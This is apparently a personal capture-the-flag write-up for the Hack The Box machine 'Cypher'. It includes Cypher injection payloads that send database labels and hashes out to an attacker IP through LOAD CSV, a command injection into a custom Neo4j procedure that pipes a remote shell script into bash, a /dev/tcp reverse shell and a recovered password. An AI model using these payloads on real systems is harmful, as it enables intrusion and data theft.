![](Pasted%20image%2020250302120440.png)
# 1.  Service Enumeration
| IP  | Port |
| --- | ---- |
| TCP | -    |
| UDP | -    |
## a. TCP Active Port
![](Pasted%20image%2020250302120508.png)
![](Pasted%20image%2020250302123534.png)
## b. UDP Active Port
![](Pasted%20image%2020250302142145.png)
## c. Domain
cypher.htb
# 2. Initial Access
## a. Web - cypher.htb
### Login
![](Pasted%20image%2020250302164602.png)
## b. Subdomain
no result
## c. Directory
feroxbuster
![](Pasted%20image%2020250302165805.png)
## d. Directory Listing
![](Pasted%20image%2020250302164924.png)
open jar file
![](Pasted%20image%2020250302165457.png)
try open using jd-gui, CustomeFunctions.class is quite ineteresting 
![](Pasted%20image%2020250302212736.png)
```
package com.cypher.neo4j.apoc;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;
import org.neo4j.procedure.Description;
import org.neo4j.procedure.Mode;
import org.neo4j.procedure.Name;
import org.neo4j.procedure.Procedure;

public class CustomFunctions {
  @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
  @Description("Returns the HTTP status code for the given URL as a string")
  public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
    if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://"))
      url = "https://" + url; 
    String[] command = { "/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url };
    System.out.println("Command: " + Arrays.toString((Object[])command));
    Process process = Runtime.getRuntime().exec(command);
    BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
    StringBuilder errorOutput = new StringBuilder();
    String line;
    while ((line = errorReader.readLine()) != null)
      errorOutput.append(line).append("\n"); 
    String statusCode = inputReader.readLine();
    System.out.println("Status code: " + statusCode);
    boolean exited = process.waitFor(10L, TimeUnit.SECONDS);
    if (!exited) {
      process.destroyForcibly();
      statusCode = "0";
      System.err.println("Process timed out after 10 seconds");
    } else {
      int exitCode = process.exitValue();
      if (exitCode != 0) {
        statusCode = "0";
        System.err.println("Process exited with code " + exitCode);
      } 
    } 
    if (errorOutput.length() > 0)
      System.err.println("Error output:\n" + errorOutput.toString()); 
    return Stream.of(new StringOutput(statusCode));
  }
  
  public static class StringOutput {
    public String statusCode;
    
    public StringOutput(String statusCode) {
      this.statusCode = statusCode;
    }
  }
}
```
try run the jar file -> `no main manifest attribute, in custom-apoc-extension-1.0-SNAPSHOT.jar`
![](Pasted%20image%2020250302213910.png)
## e. Login form
error when input single quote -> database **neo4j**
![](Pasted%20image%2020250302215509.png)
try sqlmap -> failed
![](Pasted%20image%2020250302220106.png)
https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits
- cek db
```
' RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.26:8000/?l='+label as l RETURN 0 as _0 //

' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.191:8000/?'+label AS b RETURN b//
```
![](Pasted%20image%2020250303111801.png)
![](Pasted%20image%2020250303111825.png)
- cek neo4j version -> 5.24.1
```
' RETURN 0 as _0 UNION CALL dbms.components() YIELD versions LOAD CSV FROM 'http://10.10.14.26:8000/?v='+versions[0] as v RETURN 0 as _0//

' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.26:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```
![](Pasted%20image%2020250303140409.png)
- cek value dari masing2 label
  labeh HASH menarik -> 9f54ca4c130be6d529a56dee59dc2b2090e43acf
```
' OR 1=1 WITH 1 as a MATCH (f:HASH) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.191:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```
![](Pasted%20image%2020250306090611.png)
label scan -> SCAN:eb3cf8eb641dd2e8005128c2fee4b43e59fd7785
![](Pasted%20image%2020250306093939.png)

## f. Hash Cracking
ndak bisa
## g. get shell
```
' return h.value as a UNION CALL custom.getUrlStatusCode(\"cypher.htb;curl http://10.10.14.26:8000/shell.sh| bash;\") YIELD statusCode AS a RETURN a;//
```
![](Pasted%20image%2020250306115257.png)
```
/bin/sh -i >& /dev/tcp/10.10.14.26/4444 0>&1
```
![](Pasted%20image%2020250306115356.png)
## i. Explore shell
got credentials cU4btyib.20xtCMCXkBmerhK
![](Pasted%20image%2020250306131506.png)
try ssh using that credentials -> success
![](Pasted%20image%2020250306132952.png)
# 3. Privilege Escalation
## a. First explore
sudo -l
![](Pasted%20image%2020250306133152.png)
netstat -tunlp
![](Pasted%20image%2020250306133243.png)
bbot credentials
![](Pasted%20image%2020250306134040.png)
## b. Bbot
![](Pasted%20image%2020250306140638.png)
extract root.txt
![](Pasted%20image%2020250306140720.png)
# 4. Post Exploitation
## a. User Flag
## b. Root Flag
